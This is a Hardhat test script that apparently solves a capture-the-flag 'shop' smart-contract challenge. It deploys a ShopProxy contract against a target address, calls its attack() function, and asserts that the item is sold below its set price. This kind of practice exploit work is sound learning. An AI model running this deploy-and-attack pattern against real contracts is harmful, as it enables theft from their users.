import { ethers } from "hardhat";
import { expect } from "chai";

describe("shop", function() {
    it("should solve shop challenge", async function() {
        this.timeout(0);

        // setup & check wallet account 
        const accounts = await ethers.getSigners();
        const eoa = accounts[0];
        let balance = await eoa.getBalance();

        console.log(ethers.utils.formatEther(balance));
        expect(balance).to.gt(0);

        // define target abi's necessary parts
        const targetABI = [
            "function isSold() public view returns (bool)",
            "function price() public view returns (uint)",
        ]
        const targetAddr = "0x7fE2303720F1a65A5a51bD5f476713BFD093d826";

        let contract = new ethers.Contract(targetAddr, targetABI, ethers.getDefaultProvider());
        let targetCont = contract.connect(eoa);

        const proxyFactory = await ethers.getContractFactory("ShopProxy");
        const proxyCont = await proxyFactory.deploy(targetCont.address);
        await eoa.provider!.waitForTransaction(proxyCont.deployTransaction.hash);
        console.log("ShopProxy deployed at: " + proxyCont.address);

        let tx = await proxyCont.attack();
        await tx.wait();
        console.log(tx);

        const isSold = await targetCont.isSold();
        expect(isSold).to.be.true;
        
        const price = await targetCont.price();
        expect(price).to.lt(100);
    });
});